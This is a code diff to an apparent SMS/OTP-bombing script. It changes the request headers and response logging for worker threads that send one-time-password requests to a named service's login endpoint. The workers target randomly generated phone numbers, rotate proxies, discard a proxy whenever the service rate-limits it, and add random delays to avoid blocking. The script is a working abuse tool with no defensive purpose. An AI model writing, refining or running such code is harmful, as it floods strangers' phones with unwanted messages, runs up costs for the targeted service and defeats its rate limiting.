@@ -110,7 +110,7 @@ def proxy_manager_thread():
         
         time.sleep(5)
 
-# --- OTP WORKER LOGIC (ClashX24 - No OTP Generation) ---
+# --- OTP WORKER LOGIC (Updated with provided API) ---
 def otp_worker_thread(worker_id):
     """Worker thread that grabs a proxy and sends OTPs until proxy is blocked."""
     while True:
@@ -133,16 +133,19 @@ def otp_worker_thread(worker_id):
             # Generate 10-digit phone number (must start with 6,7,8,9)
             phone = random.choice("6789") + "".join(random.choices("0123456789", k=9))
             
-            # ClashX24 Send OTP Endpoint
+            # API Endpoint
             send_otp_url = "https://api.clashx24.xyz/user/login-code"
-            send_payload = {"phone_number": phone}
             
+            # Headers from the provided code
             headers = {
-                "Content-Type": "application/json",
-                "Accept": "application/json, text/plain, */*",
-                "User-Agent": "okhttp/4.12.0",
-                "Origin": "https://clashx24.xyz",
-                "Referer": "https://clashx24.xyz/"
+                "accept": "application/json, text/plain, */*",
+                "content-type": "application/json",
+                "user-agent": "okhttp/4.12.0"
+            }
+            
+            # Payload from the provided code
+            send_payload = {
+                "phone_number": phone
             }
 
             STATE["total_attempts"] += 1
@@ -159,8 +162,14 @@ def otp_worker_thread(worker_id):
                     else:
                         STATE["code_201"] += 1
                     
-                    log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT SUCCESSFULLY! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
-                    log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}...", "info", target=phone, proxy=current_proxy)
+                    # Try to parse JSON response for better logging
+                    try:
+                        response_json = send_res.json()
+                        log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT SUCCESSFULLY! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)[:200]}...", "info", target=phone, proxy=current_proxy)
+                    except ValueError:
+                        log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT SUCCESSFULLY! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}...", "info", target=phone, proxy=current_proxy)
                     
                     # Wait before sending next OTP (avoid rate limiting)
                     time.sleep(random.uniform(0.5, 1.5))
@@ -169,13 +178,21 @@ def otp_worker_thread(worker_id):
                 elif send_res.status_code == 400:
                     STATE["code_400"] += 1
                     log_sys(f"[THREAD-{worker_id}] ❌ STATUS 400: Rate limited or blocked. Burning proxy.", "error", target=phone, proxy=current_proxy)
-                    log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text}", "error", target=phone, proxy=current_proxy)
+                    try:
+                        response_json = send_res.json()
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "error", target=phone, proxy=current_proxy)
+                    except ValueError:
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text}", "error", target=phone, proxy=current_proxy)
                     break  # Burn this proxy, get a new one
                     
                 else:
                     STATE["code_other"] += 1
                     log_sys(f"[THREAD-{worker_id}] ⚠️ UNKNOWN STATUS {send_res.status_code}. Burning proxy.", "warn", target=phone, proxy=current_proxy)
-                    log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text}", "warn", target=phone, proxy=current_proxy)
+                    try:
+                        response_json = send_res.json()
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "warn", target=phone, proxy=current_proxy)
+                    except ValueError:
+                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text}", "warn", target=phone, proxy=current_proxy)
                     break  # Burn this proxy, get a new one
 
             except requests.exceptions.Timeout:
